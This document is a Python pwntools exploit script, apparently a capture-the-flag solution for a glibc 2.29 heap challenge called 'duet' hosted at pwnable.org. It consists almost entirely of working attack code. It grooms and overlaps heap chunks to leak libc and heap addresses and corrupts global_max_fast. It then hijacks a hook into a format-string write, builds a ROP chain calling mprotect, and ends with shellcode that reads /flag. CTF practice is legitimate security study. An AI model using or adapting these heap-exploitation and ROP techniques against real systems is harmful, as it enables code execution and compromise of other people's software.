from pwn import *
import time

#r = process("./duet")
#r = process(["./ld-2.29.so", "./duet"], env={"LD_PRELOAD":"./libc-2.29.so"})
r = remote("pwnable.org",12356)

def trans(idx):
	if idx == 0:
		return "\xe7\x90\xb4\x00"
	elif idx == 1:
		return "\xe7\x91\x9f\x00"

def alloc(idx, size, data):
	r.sendlineafter(":", "1")
	r.sendlineafter(":", trans(idx))
	r.sendlineafter(":", str(size))
	r.sendafter(":", data)

def free(idx):
	r.sendlineafter(":", "2")
	r.sendlineafter(":", trans(idx))
        return r.recvline()

def show(idx):
	r.sendlineafter(":", "3")
	r.sendlineafter(":", trans(idx))

def bug(size):
	r.sendlineafter(":", "5")
	r.sendlineafter(":", str(size))

# first get some smallbins
#for i in range(1):
	#alloc(0, 0x98, "A"*(98))
	#free(0)
for i in range(5):
	alloc(0, 0x98, "A"*(0x98))
	free(0)
for i in range(7):
	alloc(0, 0x88+0x20, "A"*(0x88+0x20))
	free(0)
	alloc(0, 0x270, "A"*(0x270))
	free(0)
	alloc(0, 0x88, "A"*(0x88))
	free(0)
	alloc(0, 0xb8, "A"*(0xb8))
	free(0)
	alloc(0, 0x118, "A"*(0x118))
	free(0)
	alloc(0, 0x138, "A"*(0x138))
	free(0)
	alloc(0, 0x178, "A"*(0x178))
	free(0)
	alloc(0, 0x338, "A"*(0x338))
	free(0)
	alloc(0, 0x2f8, "A"*(0x2f8))
	free(0)
	alloc(0, 0x3d8, "A"*(0x3d8))
	free(0)
	alloc(0, 0x218, "A"*(0x218))
	free(0)
	alloc(0, 0x238, "A"*(0x238))
	free(0)

alloc(0, 0x88+0x20, "A"*(0x88+0x20))
alloc(1, 0x98, "i"*0x98)
free(0)
fake_chunk = p64(0xf0) + p64(0x20) + p64(0x0)*2
fake_chunk2 = p64(0x0) + p64(0x21) + p64(0x0)*2

alloc(0, 0xb8, "A"*0x20 + fake_chunk + fake_chunk2 + "j"*(0xb8-0x20*2-0x20))
#alloc(1, 0xb8, "D"*0xb8)
#alloc(1, 0x88, "E"*0x88)
bug(0xb0 + 0x20 + 0x20 + 0x1)
# new unsorted chunk completely engulfs chunk idx 1, and engulfs the first 0x20 bytes (including prevsize+size) of chunk 0

# now get leak using chunk 1
free(0)
alloc(0, 0x88, "D"*0x10 + p64(0x0) + p64(0xa1) + "D"*(0x88 - 0x20))
show(1)
libc_leak = u64(r.recvuntil("\x7f")[-6:] + "\x00"*2)
libc_base = libc_leak - 0x1e4ca0
print(hex(libc_base))
#free(0)
free(1)
show(0)
r.recvuntil(p64(0x0) + p64(0xa1))
heap_leak = u64(r.recv(8))
print(hex(heap_leak))
free(0)

# size of chunk in middle that is overlapped
overlapped_size = 0x300

alloc(0, 0x118, "A"*0x20 + fake_chunk + fake_chunk2 + "A"*(0x118-0x20*3))
# now we get a second stage overlap using the 0xf0 chunk in unsorted bins
# the chunk in 0xf0 overlaps with header metadata of chunk #0
#alloc(1, 0x128, "B"*0x128)
alloc(1, 0xe8, "A"*0xb0 + p64(0x0) + p64(0x120+overlapped_size+0x1-0x40) + "A"*(0xe8-0xb0-0x10)) # overwrite size of second stage chunk 0
free(1)

fake_chunk = p64(0x120+overlapped_size-0x40) + p64(0x21) + p64(0x0)*2
fake_chunk2 = p64(0x0) + p64(0x21) + p64(0x0)*2
alloc(1, overlapped_size-0x8, "B"*(overlapped_size-0x8-0x48) + fake_chunk + fake_chunk2 + p64(0x0))
free(0)
# now the 0x340 sized unsorted bins overlaps with chunk 1

pad = "O"*(cyclic(0x400).index("raah") - 0x30)
pad += p64(0x21)*20
pad += "O"*(0x400-len(pad))
pad = p64(0x21)*(0x400/8)
alloc(0, 0x400, pad) # we have to put something at end so chunk 1 doesn't consolidate
free(0)


free(1) # free the overlapped chunk
# now we have freed 0x340 smallbin engulfing freed 0x260 unsorted!!
alloc(0, overlapped_size-0xb0+0x8-0x40, "A"*(overlapped_size-0xb0+0x8-0x48-0x40) + fake_chunk + fake_chunk2 + p64(0x0)) # split this to have a 0x90 unsorted bin and we have to make another

# fix 0x3e8 unsorted next chunk
pad = "Z"*0x10 + p64(0x0) + p64(0x21) + p64(0x0)*3 + p64(0x21)
pad += "Z"*(cyclic(0xd8).index("laab") - len(pad))
pad += p64(0x3e0) + p64(0x20) + p64(0x0)*3 + p64(0x21)
pad += "Z"*(0xd8-len(pad))
alloc(1, 0xd8, pad)
free(0)
free(1)
alloc(1, 0x178, "X"*0x178)
alloc(0, 0x400, "i"*0x400)
free(0)
alloc(0, 0x138, "C"*0x110 + p64(0x0) + p64(0x241) + "A"*(0x138-0x110-0x10))
free(0)
free(1)

a0_bin = libc_base + 0x1bfd30
pad = "D"*(cyclic(0x198).index("raad"))
pad += p64(0x0) + p64(0xa1) + p64(a0_bin)*2
pad += "D"*(0x198-len(pad))
alloc(0, 0x198, pad)
free(0)

pad = "i"*(cyclic(0x400).index("qaaeraae"))
pad += p64(0x0) + p64(0x21) + p64(0x0)*3 + p64(0x21)
pad += "i"*(0x400-len(pad))
for i in range(6):
    pad = p64(0x21)*(0x400/8)
    alloc(0, 0x400, pad)
    free(0)
pad = p64(0x21)*(0x3f0/8)
for i in range(7):
    alloc(0, 0x3f0, pad)
    free(0)
pad = p64(0x21)*(0x3e0/8)
for i in range(7):
    alloc(0, 0x3e0, pad)
    free(0)

global_max_fast = libc_base + 0x1e7600 + 0x4
payload = "A"*0x290
payload += p64(0x0) + p64(0xa1) + p64(a0_bin) + p64(heap_leak + 0xa4c0)
#payload += p64(0x0) + p64(0xa1) + p64(heap_leak + 0xa4a0) + p64(a0_bin)
payload += p64(0x0) + p64(0xa1) + p64(heap_leak + 0xa4a0) + p64(global_max_fast - 0x10)
payload += "A"*(0x318-len(payload))

alloc(1, 0x318, payload)
pad = "D"*(cyclic(0xb8).index("gaaa"))
pad += (p64(0x21) + p64(0x0)*3 + p64(0x21))
pad += "D"*(0xb8-len(pad))
alloc(0, 0xb8, pad)
free(1)
pad = "A"*(cyclic(0x98).index("daab"))
pad += p64(0x0) + p64(0xc1)
pad += "A"*(0x98-len(pad))
alloc(1, 0x98, pad)

free(0)
free(1)
#topchunk = libc_base + 0x1e6a50 # free hook size
topchunk = libc_base + 0x1e4c0c # malloc hook size
#topchunk = libc_base + 0x1e54c0 # free hook aligned sice
topchunk = libc_base + 0x1e753c
pad = "A"*0x70 + p64(0x0) + p64(0xc1) + p64(topchunk)
pad += "A"*(0x98-len(pad))
alloc(1, 0x98, pad)

def make_chunk(size):
    pad = "B"*0x10 + p64(0x0) + p64(0x21) + p64(0x0)*3 + p64(0x21)
    pad += p64(0x21)*((size-len(pad))/8)
    alloc(0, size, pad)

make_chunk(0xb8)

def change_size(s):

    free(1)
    pad = "A"*0x70 + p64(0x0) + p64(s) + p64(0x0)
    pad += "A"*(0x98-len(pad))
    alloc(1, 0x98, pad)

change_size(0x5201) # change chunk to 0x3e1
free(0) # free chunk
# change fd to something big

gadget = libc_base + 0x43c30
printf = libc_base + 0x62830

alloc(0, 0xa8, "\x00"*0x5c + p64(printf) + "\x00"*(0xa8-0x5c-0x8))
free(1)
def do_printf(hacc):
    hacc += "\x00"*(0xa8-len(hacc))
    alloc(1, 0xa8, hacc)
    res = (free(1))
    #print(res)
    return res
stack_leak = int(do_printf("%17$p").strip()[:14], 16)
return_address_stack = stack_leak - 0xe0
print("RETURN ADDRESS AT", hex(return_address_stack))
print("STACK", hex(stack_leak))

poprdi = libc_base + 0x0000000000026542 # pop rdi ; ret

ropchain = p64(poprdi) + p64(return_address_stack) + p64(libc_base + 0x832f0)
print(hex(poprdi))
print(hex(return_address_stack))
print(hex(libc_base + 0x832f0))

current_address = return_address_stack & 0xffff
#r.interactive()
"""
print("START WRITING")
for byte in range(0, len(ropchain)-8, 2):
    if byte == 4 or byte == 2:
        continue
    dice = u16(ropchain[byte:byte+2])
    if dice == 0x0:
        continue
    print(hex(dice), hex(current_address + byte))
    if byte == 0:
        do_printf("%{}c%17$hn".format(current_address + byte))
    else:
        do_printf("%{}c%17$hhn".format((current_address + byte) & 0xff))
    #res = do_printf("%43$p")
    #print(res)
    do_printf("%{}c%43$hn".format(str(dice).zfill(5)))

do_printf("%{}c%17$hn".format((return_address_stack + 0x10) & 0xffff))
do_printf("%{}c%43$hn".format(u16(ropchain[16:18])))
pause()
print("SHOULD BE", hex(return_address_stack + 0x12))
do_printf("%{}c%17$hn".format((return_address_stack + 0x12) & 0xffff))
#do_printf("%{}c%43$hn".format(u16(ropchain[16:18])))"""


pause()
print("START WRITING")
for byte in range(0, len(ropchain), 2):
    if byte == 4 or byte == 2:
        continue
    dice = u16(ropchain[byte:byte+2])
    if dice == 0x0:
        continue
    print(hex(dice), hex(current_address + byte))
    #if byte == 0:
    do_printf("%{}c%31$hn".format(current_address + byte))
    #else:
        #do_printf("%{}c%31$hhn".format((current_address + byte) & 0xff))
    time.sleep(0.5)
    res = do_printf("%45$p")
    print(res)
    do_printf("%{}c%45$hn".format(str(dice).zfill(5)))

poprsi = libc_base + 0x0000000000026f9e # pop rsi ; ret
poprdx = libc_base + 0x000000000012bda6 # pop rdx ; ret
mprot = libc_base + 0x117590

stacklol = (return_address_stack >> 12) << 12
context.bits = 64
final_rop = flat([
    poprdi, stacklol,
    poprsi, 0x1000,
    poprdx, 7,
    mprot,
    return_address_stack + 0x58
])
shellcode = "\xE8\x08\x00\x00\x00\x2F\x66\x6C\x61\x67\x00\x90\x90\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\xC7\xC2\x80\x00\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\x80\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"
final_rop += shellcode
print("DONE")
pause()
r.sendlineafter(":", "6")
time.sleep(0.3)
payload = "A"*24 + final_rop
r.sendline(payload)


"""
do_printf("%{}c%17$hn".format(current_address))
for byte in range(0, len(ropchain), 1):
    dice = ord(ropchain[byte:byte+1])
    if dice == 0x0:
        continue
    print(hex(dice), hex(current_address + byte))
    do_printf("%{}c%17$hhn".format((current_address + byte) & 0xff))
    res = do_printf("%43$p")
    print(res)
    #do_printf("%{}c%43$hhn".format(dice))"""


print("DONE")


r.interactive()

change_size(0x3e1) # change chunk to 0x3e1
pause()
free(0) # free chunk
r.interactive()
